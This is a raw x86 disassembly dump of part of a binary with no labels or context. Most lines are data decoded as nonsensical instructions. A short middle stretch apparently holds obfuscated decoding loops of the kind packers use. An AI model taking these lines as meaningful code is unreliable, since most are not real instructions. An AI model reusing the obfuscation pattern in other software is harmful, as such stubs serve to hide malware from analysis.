  418602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418603:	stc    
  418604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418605:	sbb    ch,BYTE PTR [edx]
  418607:	daa    
  418608:	dec    ecx
  418609:	popf   
  41860a:	leave  
  41860b:	js     0x4185cf
  41860d:	xchg   ebx,eax
  41860e:	retf   
  41860f:	stos   BYTE PTR es:[edi],al
  418610:	repnz (bad) 
  418613:	out    0x65,eax
  418615:	test   al,0x69
  418617:	push   ss
  418618:	jmp    0xec1eab97
  41861d:	icebp  
  41861e:	rep lods al,BYTE PTR ds:[esi]
  418620:	jno    0x4185c5
  418622:	push   ecx
  418623:	aam    0x6
  418625:	test   eax,0x64088cba
  41862a:	call   0xc74b:0x3bef4d1a
  418631:	xor    eax,0x9b41c719
  418636:	(bad)  
  418637:	adc    cl,dl
  418639:	push   esp
  41863a:	es call 0xa3bb8a4d
  418640:	test   BYTE PTR [ebx-0xafafe1b],ah
  418646:	push   0xb30fe1be
  41864b:	(bad)  
  41864c:	mov    bl,0xb5
  41864e:	stc    
  41864f:	inc    edi
  418650:	pushf  
  418651:	repnz xchg esp,eax
  418653:	aam    0x5a
  418655:	push   ebp
  418656:	cld    
  418657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418658:	and    DWORD PTR [eax-0x5744be19],ebp
  41865e:	out    0x6,al
  418660:	lea    eax,[ebx+0x1ce097dc]
  418666:	dec    ecx
  418667:	loopne 0x4186ae
  418669:	bound  ebp,QWORD PTR [edx-0x56a14f0]
  41866f:	mov    cl,0xf4
  418671:	or     ecx,DWORD PTR [edx]
  418673:	int3   
  418674:	mov    esi,0xb1d60d71
  418679:	adc    eax,DWORD PTR [eax]
  41867b:	not    DWORD PTR [esi+edx*2-0x53]
  41867f:	jns    0x41862c
  418681:	nop
  418682:	and    DWORD PTR [esi+0x5b],ebp
  418685:	push   ecx
  418686:	sub    edi,DWORD PTR ds:[ecx-0x26]
  41868a:	jae    0x4186e8
  41868c:	int3   
  41868d:	shr    DWORD PTR [esi],cl
  41868f:	push   ds
  418690:	(bad)
  418694:	mov    al,0x3f
  418696:	push   edi
  418697:	fistp  DWORD PTR [edx+eax*8-0x5f]
  41869b:	cli    
  41869c:	adc    al,0xa6
  41869e:	mov    ?,WORD PTR [ecx-0x626aa169]
  4186a4:	push   ecx
  4186a5:	add    eax,0x40f6e28b
  4186aa:	xchg   esp,eax
  4186ab:	icebp  
  4186ac:	mov    DWORD PTR [ecx-0x4ba9398],0xaa8f0054
  4186b6:	jmp    0x4de7:0x9b0f7530
  4186bd:	push   es
  4186be:	jmp    0x4186ba
  4186c0:	pusha  
  4186c1:	push   eax
  4186c2:	into   
  4186c3:	jle    0x41866a
  4186c5:	xchg   DWORD PTR [ebx+ebx*8],ebp
  4186c8:	push   cs
  4186c9:	sahf   
  4186ca:	and    DWORD PTR [edx+0x1a],esi
  4186cd:	jmp    0x418668
  4186cf:	and    DWORD PTR [ebp-0x6a],ebp
  4186d2:	aas    
  4186d3:	call   0x824dfd8d
  4186d8:	test   eax,0x8032a053
  4186dd:	and    edx,esi
  4186df:	test   DWORD PTR [ecx],edx
  4186e1:	enter  0x1fbf,0x80
  4186e5:	cmp    cl,BYTE PTR [edx-0x41]
  4186e8:	mov    esi,gs
  4186ea:	das    
  4186eb:	stc    
  4186ec:	jmp    0x418734
  4186ee:	repz push ds
  4186f0:	sahf   
  4186f1:	xchg   ebx,eax
  4186f2:	outs   dx,BYTE PTR ds:[esi]
  4186f3:	bound  ebx,QWORD PTR [eax+0x31]
  4186f6:	mov    gs,WORD PTR [edx+0x3a]
  4186f9:	sti    
  4186fa:	and    cl,ch
  4186fc:	jbe    0x418761
  4186fe:	fiadd  WORD PTR [ebp+edx*4-0x30]
  418702:	fwait
  418703:	in     al,0x51
  418705:	jnp    0x4186d6
  418707:	mov    bh,0x29
  418709:	fwait
  41870a:	xor    al,0xa3
  41870c:	dec    edi
  41870d:	push   eax
  41870e:	sbb    ecx,DWORD PTR [eax+0x5f060e58]
  418714:	(bad)  
  418715:	jnp    0x4186cf
  418717:	out    0xef,al
  418719:	push   0xffffffbf
  41871b:	xor    al,0x41
  41871d:	test   DWORD PTR [eax+ebx*4+0x28],edx
  418721:	jne    0x4186ac
  418723:	dec    ebx
  418724:	aaa    
  418725:	cld    
  418726:	pop    ds
  418727:	ss loop 0x4186d2
  41872a:	add    al,0xde
  41872c:	xchg   ebp,eax
  41872d:	rcr    edi,cl
  41872f:	(bad)  
  418730:	and    DWORD PTR [esi],eax
  418732:	inc    ebp
  418734:	int    0x12
  418736:	ds pop esi
  418738:	jg     0x418706
  41873a:	sbb    al,0x5
  41873c:	adc    al,0x5f
  41873e:	pop    es
  41873f:	dec    ecx
  418740:	icebp  
  418741:	sub    dl,BYTE PTR [ebp-0x7d072f9b]
  418747:	fisttp WORD PTR [edi]
  418749:	mov    al,ds:0x4c478061
  41874e:	out    dx,eax
  41874f:	sub    edx,ebx
  418751:	pop    esi
  418752:	mov    al,0xd2
  418754:	mov    dl,0x1a
  418756:	adc    eax,0x5cb4fd48
  41875b:	fld    TBYTE PTR [eax]
  41875d:	mov    ch,0xad
  41875f:	xchg   ecx,eax
  418760:	outs   dx,BYTE PTR ds:[esi]
  418761:	mov    eax,gs
  418763:	dec    ebp
  418764:	pushf  
  418765:	mov    bl,0x3c
  418767:	and    BYTE PTR [edx+0x3c],bh
  41876a:	ret    
  41876b:	pop    ebx
  41876c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41876d:	mov    eax,ds:0x8d2ce917
  418772:	fwait
  418773:	mov    WORD PTR [eax+0x5e],cs
  418776:	pop    esp
  418777:	push   ebp
  418778:	add    DWORD PTR [edx-0xace222],esi
  41877e:	loopne 0x4187ce
  418780:	mov    WORD PTR [edx+0x6c14007e],ss
  418786:	push   ebp
  418787:	fidivr DWORD PTR [esi-0x49]
  41878a:	fild   DWORD PTR [edi+0x78efb19f]
  418790:	stos   BYTE PTR es:[edi],al
  418791:	cmc    
  418792:	cwde   
  418793:	sub    ebx,DWORD PTR ds:0xb3e79d3a
  418799:	and    esi,DWORD PTR [esi-0x77]
  41879c:	aad    0x6f
  41879e:	fld    QWORD PTR [edi+0x3d]
  4187a1:	jmp    0xf709:0xea226fd8
  4187a8:	jl     0x4187ae
  4187aa:	mov    bl,0x76
  4187ac:	stc    
  4187ad:	cwd    
  4187af:	xor    esp,DWORD PTR [edi+edx*4]
  4187b2:	pop    ebp
  4187b3:	cmp    eax,0xaa17dc1e
  4187b8:	sbb    ebp,eax
  4187ba:	stos   DWORD PTR es:[edi],eax
  4187bb:	mov    edx,0xfca862ec
  4187c0:	retf   
  4187c1:	push   edi
  4187c2:	dec    edi
  4187c3:	lods   eax,DWORD PTR ds:[esi]
  4187c4:	jno    0x4187fe
  4187c6:	les    edi,FWORD PTR ds:0xb3a119e4
  4187cc:	cs fwait
  4187ce:	push   ds
  4187cf:	dec    DWORD PTR [eax-0x2]
  4187d2:	xlat   BYTE PTR ds:[ebx]
  4187d3:	add    BYTE PTR [edx],0x23
  4187d6:	jmp    0xb2e9af04
  4187db:	mov    eax,ds:0x66736041
  4187e0:	inc    esp
  4187e1:	mov    ebp,0xa5517ed6
  4187e6:	pop    ecx
  4187e7:	jne    0x418866
  4187e9:	fs (bad) 
  4187ec:	fucomi st,st(1)
  4187ee:	adc    DWORD PTR ds:0xd80a28e3,esp
  4187f4:	scas   al,BYTE PTR es:[edi]
  4187f5:	xchg   edx,eax
  4187f6:	xlat   BYTE PTR ds:[ebx]
  4187f7:	jno    0x418810
  4187f9:	xchg   ecx,eax
  4187fa:	ins    BYTE PTR es:[edi],dx
  4187fb:	imul   ecx,DWORD PTR [eax],0xffffffe5
  4187fe:	rcr    DWORD PTR [ebp+0x2060b9f5],cl
  418804:	iret   
  418805:	jo     0x4187ae
  418807:	mov    edi,0x5303872f
  41880c:	aad    0x69
  41880e:	sbb    BYTE PTR [esi+eax*1],ch
  418811:	or     ah,BYTE PTR ds:0x30ce1ce
  418817:	push   ss
  418818:	nop    DWORD PTR [ebp-0x688606ab]
  41881f:	pusha  
  418820:	addr16 sub ebp,esp
  418823:	xor    eax,0xa3575806
  418828:	xchg   edi,eax
  418829:	dec    eax
  41882a:	jecxz  0x418897
  41882c:	(bad)  
  41882d:	jb     0x41887c
  41882f:	add    al,0x4f
  418831:	mul    DWORD PTR [eax+ebx*4+0x69]
  418835:	mov    edx,0x250df754
  41883a:	mov    esi,0x1a172a29
  41883f:	test   eax,0x7158d404
  418844:	xchg   esi,eax
  418845:	xchg   edi,eax
  418846:	stos   DWORD PTR es:[edi],eax
  418847:	aas    
  418848:	cwde   
  418849:	dec    esp
  41884a:	lods   eax,DWORD PTR ds:[esi]
  41884b:	adc    DWORD PTR [edx],esi
  41884d:	pop    ss
  41884e:	out    0xfc,eax
  418850:	in     al,dx
  418851:	ret    
  418852:	loope  0x4187ff
  418854:	test   BYTE PTR [ebx+0x4a],bl
  418857:	mov    esi,0x31216e24
  41885c:	call   0xeb870e3
  418861:	dec    edi
  418862:	xchg   edi,eax
  418863:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418864:	inc    ebp
  418865:	clc    
  418866:	sub    eax,0xb499f08b
  41886b:	pop    esp
  41886c:	pop    esp
  41886d:	mov    DWORD PTR ds:0xf8facfd2,ecx
  418873:	fdivr  st,st(1)
  418875:	stos   BYTE PTR es:[edi],al
  418876:	mov    ch,0x3b
  418878:	mov    ds:0xf5efd5ed,al
  41887d:	xchg   edx,eax
  41887e:	pop    ebp
  41887f:	fsubr  QWORD PTR [esp+eax*8-0x3c]
  418883:	cmp    eax,0x59b3d2a2
  418888:	clc    
  418889:	sbb    DWORD PTR [ebx-0x505cd4a0],edi
  41888f:	adc    dl,BYTE PTR [ecx-0x72ac0464]
  418895:	je     0x418822
  418897:	pop    ebp
  418898:	clc    
  418899:	add    DWORD PTR ds:0x42c018,0x28a0
  4188a3:	xor    edx,eax
  4188a5:	xor    ebx,eax
  4188a7:	sub    edx,ebx
  4188a9:	sub    DWORD PTR ds:0x42a008,ebx
  4188af:	sub    edx,esi
  4188b1:	mov    DWORD PTR ds:0x42c000,0x11
  4188bb:	cmp    DWORD PTR ds:0x42c000,0x0
  4188c2:	je     0x418917
  4188c8:	cmp    DWORD PTR ds:0x42c000,0x9
  4188cf:	jne    0x4188e5
  4188d5:	push   0x42a018
  4188da:	push   0x42e165
  4188df:	call   DWORD PTR ds:0x42ed6f
  4188e5:	cmp    DWORD PTR ds:0x42c000,0xa
  4188ec:	jne    0x4188ff
  4188f2:	mov    ebx,DWORD PTR ds:0x42c000
  4188f8:	dec    ebx
  4188f9:	mov    DWORD PTR ds:0x42c000,ebx
  4188ff:	mov    ebx,DWORD PTR ds:0x42c000
  418905:	dec    ebx
  418906:	mov    DWORD PTR ds:0x42c000,ebx
  41890c:	jmp    0x4188bb
  418911:	sub    ebx,DWORD PTR ds:0x429004
  418917:	xor    edx,eax
  418919:	neg    ebx
  41891b:	mov    DWORD PTR [ebp+0x8],edx
  41891e:	mov    edx,DWORD PTR [ebp+0x8]
  418921:	mov    ebx,DWORD PTR [ebp-0x58]
  418924:	add    edx,0x5708f8
  41892a:	or     DWORD PTR ds:0x42d014,0x42c014
  418934:	imul   edx,ebx
  418937:	sub    DWORD PTR ds:0x42d004,0x2934
  418941:	mov    DWORD PTR [ebp-0x58],edx
  418944:	mov    edx,DWORD PTR [ebp+0x8]
  418947:	mov    ebx,DWORD PTR [ebp-0x54]
  41894a:	adc    DWORD PTR ds:0x429010,0x42c010
  418954:	add    edx,0x64f8da
  41895a:	sbb    DWORD PTR ds:0x429028,0xbc3
  418964:	or     edx,ebx
  418966:	xor    DWORD PTR ds:0x42b008,edi
  41896c:	mov    DWORD PTR [ebp-0x54],edx
  41896f:	mov    edx,DWORD PTR [ebp+0x8]
  418972:	and    DWORD PTR ds:0x42b018,ebx
  418978:	mov    ebx,DWORD PTR [ebp-0x50]
  41897b:	or     DWORD PTR ds:0x42c014,0x42b010
  418985:	add    edx,ecx
  418987:	xor    edx,ebx
  418989:	mov    DWORD PTR [ebp-0x50],edx
  41898c:	mov    edx,DWORD PTR [ebp+0x8]
  41898f:	mov    ebx,DWORD PTR [ebp-0x4c]
  418992:	add    edx,edi
  418994:	and    edx,ebx
  418996:	mov    DWORD PTR [ebp-0x4c],edx
  418999:	mov    edx,DWORD PTR [ebp+0x8]
  41899c:	mov    ebx,DWORD PTR [ebp-0x48]
  41899f:	lea    edx,[ebx+edx*1+0x241fc1f]
  4189a6:	mov    DWORD PTR [ebp-0x48],edx
  4189a9:	mov    edx,DWORD PTR [ebp+0x8]
  4189ac:	mov    ebx,0xfa5e15e2
  4189b1:	sub    ebx,edx
  4189b3:	add    ebx,DWORD PTR [ebp-0x44]
  4189b6:	mov    DWORD PTR [ebp-0x44],ebx
  4189b9:	mov    edx,DWORD PTR [ebp+0x8]
  4189bc:	xor    edx,eax
  4189be:	add    edx,esi
  4189c0:	jne    0x416500
  4189c6:	mov    edx,DWORD PTR [ebp-0xc]
  4189c9:	mov    dl,BYTE PTR [ebp+edx*1-0x98]
  4189d0:	mov    bl,BYTE PTR [ebp-0x1]
  4189d3:	cmp    dl,bl
  4189d5:	je     0x418a95
  4189db:	mov    edx,DWORD PTR [ebp-0xc]
  4189de:	mov    dl,BYTE PTR [ebp+edx*1-0x98]
  4189e5:	mov    ebx,DWORD PTR [ebp+0xc]
  4189e8:	cmp    dl,BYTE PTR [ebx]
  4189ea:	jne    0x4219f0
  4189f0:	mov    edx,DWORD PTR [ebp-0x18]
  4189f3:	mov    ebx,DWORD PTR [ebp+0xc]
  4189f6:	movsx  ebx,BYTE PTR [ebx]
  4189f9:	xor    edx,eax
  4189fb:	add    edx,esi
  4189fd:	cmp    ebx,edx
  4189ff:	mov    edx,DWORD PTR [ebp-0x10]
  418a02:	mov    DWORD PTR [ebp+0x8],edx
  418a05:	mov    edx,DWORD PTR [ebp+0x8]
  418a08:	je     0x423e79
  418a0e:	jmp    0x418a86
  418a13:	mov    edx,DWORD PTR [ebp+0x8]
  418a16:	mov    ebx,DWORD PTR [ebp-0x8]
  418a19:	xor    edx,eax
  418a1b:	xor    ebx,eax
  418a1d:	sub    edx,ebx
  418a1f:	sub    edx,esi
  418a21:	xor    edx,eax
  418a23:	mov    DWORD PTR [ebp+0x8],edx
  418a26:	mov    edx,DWORD PTR [ebp+0x8]
  418a29:	mov    ebx,DWORD PTR [ebp-0x58]
  418a2c:	add    edx,0x5708f8
  418a32:	imul   edx,ebx
  418a35:	mov    DWORD PTR [ebp-0x58],edx
  418a38:	mov    edx,DWORD PTR [ebp+0x8]
  418a3b:	mov    ebx,DWORD PTR [ebp-0x54]
  418a3e:	add    edx,0x64f8da
  418a44:	or     edx,ebx
  418a46:	mov    DWORD PTR [ebp-0x54],edx
  418a49:	mov    edx,DWORD PTR [ebp+0x8]
  418a4c:	mov    ebx,DWORD PTR [ebp-0x50]
  418a4f:	add    edx,ecx
  418a51:	xor    edx,ebx
  418a53:	mov    DWORD PTR [ebp-0x50],edx
  418a56:	mov    edx,DWORD PTR [ebp+0x8]
  418a59:	mov    ebx,DWORD PTR [ebp-0x4c]
  418a5c:	add    edx,edi
  418a5e:	and    edx,ebx
  418a60:	mov    DWORD PTR [ebp-0x4c],edx
  418a63:	mov    edx,DWORD PTR [ebp+0x8]
  418a66:	mov    ebx,DWORD PTR [ebp-0x48]
  418a69:	lea    edx,[ebx+edx*1+0x241fc1f]
  418a70:	mov    DWORD PTR [ebp-0x48],edx
  418a73:	mov    edx,DWORD PTR [ebp+0x8]
  418a76:	mov    ebx,0xfa5e15e2
  418a7b:	sub    ebx,edx
  418a7d:	add    ebx,DWORD PTR [ebp-0x44]
  418a80:	mov    DWORD PTR [ebp-0x44],ebx
  418a83:	mov    edx,DWORD PTR [ebp+0x8]
  418a86:	xor    edx,eax
  418a88:	add    edx,esi
  418a8a:	jne    0x418a13
  418a90:	jmp    0x41aea6
  418a95:	mov    edx,DWORD PTR [ebp-0x10]
  418a98:	mov    DWORD PTR [ebp+0x8],edx
  418a9b:	jmp    0x41ae99
  418aa0:	mov    edx,DWORD PTR [ebp+0x8]
  418aa3:	mov    ebx,DWORD PTR [ebp-0x8]
  418aa6:	xor    edx,eax
  418aa8:	xor    ebx,eax
  418aaa:	sub    edx,ebx
  418aac:	sub    edx,esi
  418aae:	xor    edx,eax
  418ab0:	jmp    0x41ae39
  418ab5:	rcr    BYTE PTR [bx+di-0x68],cl
  418ab9:	iret   
  418aba:	ja     0x418a63
  418abc:	jno    0x418a89
  418abe:	into   
  418abf:	fidiv  WORD PTR [edx+esi*2+0x0]
  418ac3:	or     BYTE PTR [edx-0x23],dh
  418ac6:	xor    al,0x79
  418ac8:	jp     0x418ad0
  418aca:	pop    edi
  418acb:	jp     0x418b47
  418acd:	pop    ebx
  418ace:	fcom   QWORD PTR [eax]
  418ad0:	outs   dx,DWORD PTR ds:[esi]
  418ad1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ad2:	loope  0x418afa
  418ad4:	fbld   TBYTE PTR ds:0xa8e76154
  418ada:	mov    cl,0x62
  418adc:	in     al,dx
  418add:	imul   edi,DWORD PTR [ebx],0xef4882e8
  418ae3:	push   ecx
  418ae4:	sbb    ebx,edi
  418ae6:	(bad)  
  418ae7:	sbb    eax,0x672a8db5
  418aec:	add    cl,dl
  418aee:	sbb    al,0xbb
  418af0:	jl     0x418ac9
  418af2:	sub    ebx,ebx
  418af4:	out    dx,eax
  418af5:	enter  0xf537,0x7d
  418af9:	sti    
  418afa:	lods   eax,DWORD PTR ds:[esi]
  418afb:	or     DWORD PTR [esi-0x6],edi
  418afe:	mov    DWORD PTR [edi-0x10a44c54],esp
  418b04:	pop    ebx
  418b05:	shl    DWORD PTR [edx-0x2e],0xa2
  418b09:	cdq    
  418b0a:	repz pop eax
  418b0c:	xchg   esp,eax
  418b0d:	out    0xe4,al
  418b0f:	xor    eax,0x5041c231
  418b14:	or     al,0x24
  418b16:	xor    al,0x88
  418b18:	out    dx,al
  418b19:	sub    ebp,edi
  418b1b:	mov    ebx,0xebcbbcec
  418b20:	leave  
  418b21:	jle    0x418b9e
  418b23:	adc    al,0x4d
  418b25:	or     eax,0x736d72ad
  418b2a:	sti    
  418b2b:	int3   
  418b2c:	push   edi
  418b2d:	and    dh,BYTE PTR [esi+0x61]
  418b30:	arpl   WORD PTR [edi-0x36],ax
  418b33:	ja     0x418b0a
  418b35:	xor    BYTE PTR [ecx],0xc7
  418b38:	mov    ah,0xa7
  418b3a:	repz pop esi
  418b3c:	jnp    0x418b8b
  418b3e:	loopne 0x418b0e
  418b40:	xor    DWORD PTR [ebp-0xcd2ede2],ebp
  418b46:	in     al,0x32
  418b48:	xor    dh,dl
  418b4a:	xchg   al,ch
  418b4c:	out    0xfa,al
  418b4e:	xchg   edi,eax
  418b4f:	xor    ecx,esp
  418b51:	nop
  418b52:	or     dh,cl
  418b54:	cs int 0x89
  418b57:	sub    al,cl
  418b59:	xor    ah,BYTE PTR [edi]
  418b5b:	xchg   esi,eax
  418b5c:	lods   al,BYTE PTR ds:[esi]
  418b5d:	add    edi,DWORD PTR [esi]
  418b5f:	(bad)  
  418b60:	pop    ss
  418b61:	mov    ds:0x6b712790,al
  418b66:	fist   WORD PTR [edx-0x3d]
  418b69:	inc    eax
  418b6a:	ins    DWORD PTR es:[edi],dx
  418b6b:	add    ebp,DWORD PTR [ecx]
  418b6d:	push   ecx
  418b6e:	adc    al,0xd
  418b70:	cli    
  418b71:	(bad)  
  418b72:	les    esi,FWORD PTR [ecx+edi*8]
  418b75:	enter  0x1ae2,0xae
  418b79:	imul   ebx,DWORD PTR [ebx+0x79],0x131e592b
  418b80:	out    dx,eax
  418b81:	test   ax,0x1718
  418b85:	call   0x8219a915
  418b8a:	mov    ebx,ebx
  418b8c:	jnp    0x418bdb
  418b8e:	mov    ebp,0xc29752c5
  418b93:	xor    ecx,DWORD PTR [ebp-0x72]
  418b96:	repz sar bh,cl
  418b99:	iret   
  418b9a:	ins    BYTE PTR es:[edi],dx
  418b9b:	xor    BYTE PTR [ecx],dl
  418b9d:	mov    al,0x56
  418b9f:	jmp    0xb752323b
  418ba4:	(bad)  
  418ba5:	push   ebx
  418ba6:	mov    ecx,0x2a2ceef1
  418bab:	aas    
  418bac:	lds    edx,FWORD PTR [edi]
  418bae:	aas    
  418baf:	sbb    bl,BYTE PTR [eax]
  418bb1:	out    dx,al
  418bb2:	scas   eax,DWORD PTR es:[edi]
  418bb3:	mov    ds:0x9e362cb7,eax
  418bb8:	(bad)  
  418bb9:	repnz cmp ch,0xbe
  418bbd:	sbb    ebp,ebp
  418bbf:	jecxz  0x418bce
  418bc1:	fcmovbe st,st(2)
  418bc3:	scas   eax,DWORD PTR es:[edi]
  418bc4:	xchg   ebx,eax
  418bc5:	adc    DWORD PTR [edx-0x7912fb66],edx
  418bcb:	and    BYTE PTR [eax],dl
  418bcd:	jb     0x418c3f
  418bcf:	pop    edx
  418bd0:	sub    BYTE PTR [ebp-0x3e],0xe9
  418bd4:	mov    edx,eax
  418bd6:	and    esp,DWORD PTR [ebp+0x15]
  418bd9:	into   
  418bda:	cs jecxz 0x418c23
  418bdd:	pop    esp
  418bde:	shl    BYTE PTR [esi+ecx*2+0x53],cl
  418be2:	mov    ah,0x9a
  418be4:	mul    BYTE PTR ds:0xbd4b82fe
  418bea:	and    eax,0xa292de0c
  418bef:	or     BYTE PTR [ebx-0x4a84dde4],ah
  418bf5:	xor    ebp,DWORD PTR [edx]
  418bf7:	stos   DWORD PTR es:[edi],eax
  418bf8:	idiv   ecx
  418bfa:	test   al,0x38
  418bfc:	inc    edx
  418bfd:	leave  
  418bfe:	mov    cl,bh
  418c00:	mov    eax,ds:0x5995a33
  418c05:	aaa    
  418c06:	mov    esi,0x5b07a47e
  418c0b:	push   es
  418c0c:	in     al,0x44
  418c0e:	inc    esp
  418c0f:	frndint 
  418c11:	push   ds
  418c12:	mov    WORD PTR [ecx+0x5a],?
  418c15:	ficom  WORD PTR [ecx-0x4fb9e29]
  418c1b:	cmc    
  418c1c:	xor    esp,esp
  418c1e:	inc    edx
  418c1f:	addr16 mov al,0xa
  418c22:	nop
  418c23:	mov    BYTE PTR [ecx],0x8
  418c26:	xchg   edi,eax
  418c27:	push   esp
  418c28:	and    DWORD PTR [edx+0x65],0xa
  418c2c:	idiv   BYTE PTR [ebx+0x7c]
  418c2f:	sbb    al,0x30
  418c31:	push   ecx
  418c32:	push   ebp
  418c33:	repnz aad 0x26
  418c36:	mov    dh,0xe6
  418c38:	xchg   esi,eax
  418c39:	mov    al,BYTE PTR [esi-0x36b79054]
  418c3f:	xchg   esi,eax
  418c40:	in     eax,dx
  418c41:	dec    edx
  418c42:	inc    ebx
  418c43:	xchg   ebx,eax
  418c44:	icebp  
  418c45:	xchg   esp,eax
  418c46:	inc    edi
  418c47:	dec    edi
  418c48:	jge    0x418c33
  418c4a:	mov    ds:0x264d4c8b,eax
  418c4f:	and    al,0x88
  418c51:	leave  
  418c52:	dec    edi
  418c53:	ret    
  418c54:	fwait
  418c55:	mov    edi,edi
  418c57:	pop    ecx
  418c58:	out    dx,al
  418c59:	cmp    edx,DWORD PTR [edi+0x6965e8c1]
  418c5f:	lahf   
  418c60:	stc    
  418c61:	das    
  418c62:	clc    
  418c63:	sbb    ch,BYTE PTR [esi+0x6d47e016]
  418c69:	in     al,dx
  418c6a:	rcl    DWORD PTR [ebx+0x76927c84],0xe5
  418c71:	mov    BYTE PTR [esp+edi*2+0x72f6fcd1],ch
  418c78:	ret    
  418c79:	mov    esi,ecx
  418c7b:	jne    0x418ced
  418c7d:	xor    al,0x2e
  418c7f:	xchg   ecx,eax
  418c80:	pop    eax
  418c81:	(bad)  [eax]
  418c83:	mov    eax,ds:0xf68b1a37
  418c88:	xchg   edi,eax
  418c89:	xchg   ebx,eax
  418c8a:	sbb    bl,BYTE PTR [ecx]
  418c8c:	mov    ebx,0xfebd5ec4
  418c91:	mov    esi,0xbe0b0074
  418c96:	shl    BYTE PTR [eax],cl
  418c98:	sbb    DWORD PTR [ecx-0x60],edi
  418c9b:	rol    ch,1
  418c9d:	jg     0x418c3e
  418c9f:	mov    eax,0xd2e5a656
  418ca4:	stos   BYTE PTR es:[edi],al
  418ca5:	mov    ecx,0xd9cbf2b1
  418caa:	les    edi,FWORD PTR [esp+edi*8+0x35]
  418cae:	inc    eax
  418caf:	mov    ds:0xfe632640,al
  418cb4:	out    0xe3,eax
  418cb6:	dec    eax
  418cb7:	dec    ebx
  418cb8:	cmp    esi,DWORD PTR [eax]
  418cba:	and    BYTE PTR [esi-0x14],ah
  418cbd:	inc    esp
  418cbe:	cmp    DWORD PTR [ebx+eiz*1-0x5d443712],esi
  418cc5:	in     eax,0xcd
  418cc7:	popa   
  418cc8:	add    BYTE PTR [edx-0x1447a643],al
  418cce:	call   0x90174e90
  418cd3:	pop    ds
  418cd4:	adc    BYTE PTR [ebx],dl
  418cd6:	cmp    al,0x1a
  418cd8:	mov    esi,0x3e287d17
  418cdd:	(bad)  
  418cde:	jns    0x418d41
  418ce0:	retf   
  418ce1:	cmp    eax,0x91e53b58
  418ce6:	mov    eax,0xe961b457
  418ceb:	fsub   QWORD PTR [edi]
  418ced:	push   ebp
  418cee:	aad    0xdb
  418cf0:	call   0x13a9:0x3ab8d026
  418cf7:	jle    0x418d4c
  418cf9:	fwait
  418cfa:	sbb    eax,0xf37e61db
  418cff:	xchg   ecx,eax
  418d00:	mov    eax,0x331e3a2c
  418d05:	adc    ecx,eax
  418d07:	stos   DWORD PTR es:[edi],eax
  418d08:	mov    bl,0xbf
  418d0a:	push   es
  418d0b:	out    dx,eax
  418d0c:	add    BYTE PTR [esp+edx*4],dh
  418d0f:	pop    edi
  418d10:	pop    ebx
  418d11:	sub    al,0x9a
  418d13:	dec    ebx
  418d14:	pop    edi
  418d15:	xor    al,0x10
  418d17:	mov    ah,0xdd
  418d19:	dec    eax
  418d1a:	imul   ecx,DWORD PTR ds:[ebx-0x2daca19b],0x1d31d7ad
  418d25:	sub    BYTE PTR [ebp-0x641bf3f],dl
  418d2b:	call   0xc8d4:0x26ae0d4
  418d32:	(bad)  
  418d34:	repnz outs dx,BYTE PTR ds:[esi]
  418d36:	xlat   BYTE PTR ds:[ebx]
  418d37:	adc    al,0xa6
  418d39:	(bad)  
  418d3a:	(bad)  
  418d3b:	shl    eax,cl
  418d3d:	mov    ?,esi
  418d3f:	cmp    DWORD PTR [ebx+0x7957a04d],ecx
  418d45:	cmp    eax,0xae82f995
  418d4a:	imul   esp,DWORD PTR [edi],0xa6a2e79f
  418d50:	sbb    al,0x10
  418d52:	inc    esp
  418d53:	mov    al,ds:0x183e2f03
  418d58:	pop    ss
  418d59:	iret   
  418d5a:	inc    esi
  418d5b:	jb     0x418d3d
  418d5d:	cmc    
  418d5e:	mov    WORD PTR [ebx+esi*4+0x7],ds
  418d62:	sub    DWORD PTR [edx+0x47],eax
  418d65:	push   0xffffffed
  418d67:	push   ds
  418d68:	inc    esi
  418d69:	(bad)  
  418d6a:	clc    
  418d6b:	pop    eax
  418d6c:	and    edi,DWORD PTR [esi]
  418d6e:	add    eax,0x5015f6d0
  418d73:	in     al,0x78
  418d75:	cmp    BYTE PTR [edi],ah
  418d77:	adc    BYTE PTR [edi-0x7e5a092d],dl
  418d7d:	fdiv   st(3),st
  418d7f:	xchg   DWORD PTR [esi],edx
  418d81:	stos   BYTE PTR es:[edi],al
  418d82:	fwait
  418d83:	mov    ecx,0x5c5af3a3
  418d88:	lods   eax,DWORD PTR ds:[esi]
  418d89:	scas   al,BYTE PTR es:[edi]
  418d8a:	mov    ebx,0xe526a584
  418d8f:	mov    edi,0x6e655f1b
  418d94:	fwait
  418d95:	arpl   WORD PTR [eax],bp
  418d97:	loopne 0x418d6b
  418d99:	fst    DWORD PTR [eax+0x2a10430d]
  418d9f:	or     ebx,DWORD PTR [ebp+eiz*1-0x4c212c32]
  418da6:	sbb    DWORD PTR [ebx],edx
  418da8:	or     BYTE PTR [edx-0x10],0x8d
  418dac:	(bad)  
  418dad:	(bad)  
  418dae:	mov    edi,0xb24e6ba
  418db3:	in     eax,0x8d
  418db5:	mov    bh,0x75
  418db7:	push   ds
  418db8:	fld    DWORD PTR [ecx]
  418dba:	dec    esi
  418dbb:	sbb    al,0x45
  418dbd:	ss hlt 
  418dbf:	mov    bl,BYTE PTR [eax]
  418dc1:	dec    esp
  418dc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dc3:	sub    bh,BYTE PTR [ecx+0xe26bd7f]
  418dc9:	sub    BYTE PTR [esi+0x6019ec4a],bh
  418dcf:	ins    BYTE PTR es:[edi],dx
  418dd0:	mov    ds:0x49721bff,eax
  418dd5:	jne    0x418d76
  418dd7:	dec    esi
  418dd8:	pushf  
  418dd9:	ds xchg ecx,eax
  418ddb:	hlt    
  418ddc:	out    0x68,eax
  418dde:	rol    BYTE PTR ds:0x4869fe5f,0x41
  418de5:	push   0xbbcd4e34
  418dea:	jle    0x418d90
  418dec:	pushf  
  418ded:	ja     0x418da0
  418def:	or     esp,0x4c
  418df2:	test   DWORD PTR [ecx-0x3dc83998],edi
  418df8:	loop   0x418da0
  418dfa:	push   0xffffffbe
  418dfc:	cmp    BYTE PTR [ebx+0x676fc228],bl
  418e02:	push   esi
  418e03:	das    
  418e04:	rcr    DWORD PTR [edx+0x2c1e3e84],0xda
  418e0b:	sbb    al,0x60
  418e0d:	dec    edi
  418e0e:	in     al,dx
  418e0f:	mov    eax,0x7f28859e
